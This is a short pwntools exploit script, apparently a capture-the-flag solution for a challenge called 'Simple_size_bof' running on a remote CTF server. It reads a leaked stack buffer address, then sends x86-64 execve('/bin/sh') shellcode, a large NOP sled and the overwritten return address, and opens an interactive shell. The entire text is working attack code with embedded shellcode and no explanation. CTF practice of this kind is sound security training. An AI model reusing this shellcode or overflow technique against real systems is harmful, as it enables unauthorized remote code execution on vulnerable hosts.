from pwn import *

#p = process('./Simple_size_bof')
p = remote("ctf.j0n9hyun.xyz", 3005)

#gdb.attach(p)

print p.recvuntil('buf: ')
buff_addr = int(p.recvuntil('\n').replace('\n',''),16)

print 'buff_addr = ', hex(buff_addr)

payload = ''
payload += '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' # 27 bytes
payload += '\x90'*0x6d1d
payload += p64(buff_addr)

p.sendline(payload)

sleep(0.5)

p.interactive()

